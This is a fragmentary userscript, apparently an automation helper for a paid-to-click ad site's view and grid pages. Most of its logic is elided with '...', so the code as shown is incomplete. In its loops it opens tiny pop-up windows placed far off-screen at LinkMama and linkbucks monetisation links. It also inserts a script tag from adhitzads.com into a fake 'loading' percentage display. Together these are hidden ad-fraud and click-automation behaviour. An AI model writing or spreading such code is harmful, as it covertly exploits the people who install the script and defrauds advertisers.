...
// @require     http://userscripts.org/scripts/source/162751.user.js?
// ==/UserScript==
...
if( wparent.location.href.indexOf('viewads.php') != -1 && top == self){
	...
	function rec(ctr){
		...
		if(arr[ctr]){
			...
			wparent.open("http://767425je.LinkMama.com","","width=100,height=100,top=1000,left=20000") ;
		}	
	}
	rec(ctr);
...
if(wparent.location.href.indexOf('view.php?') != -1||wparent.location.href.indexOf('gridview.php?') != -1){
	...
	$('iframe:last').load(function(){
		...
		var inters = setInterval(function(){
			div.text('loading: '+ (wparent.cnt--) +'%'+'<script type="text/javascript" src="http://adhitzads.com/584837"></script>')
...
if(wparent.location.href.indexOf('progrid.php') != -1){
	...
	function rec(ctr){
		...
		if(arr[ctr]){
			...
			wparent.open("http://0bff721d.linkbucks.com","","width=100,height=100,top=1000,left=20000") ;
		}	
	}
	rec(ctr);
	wparent.success = function(r){
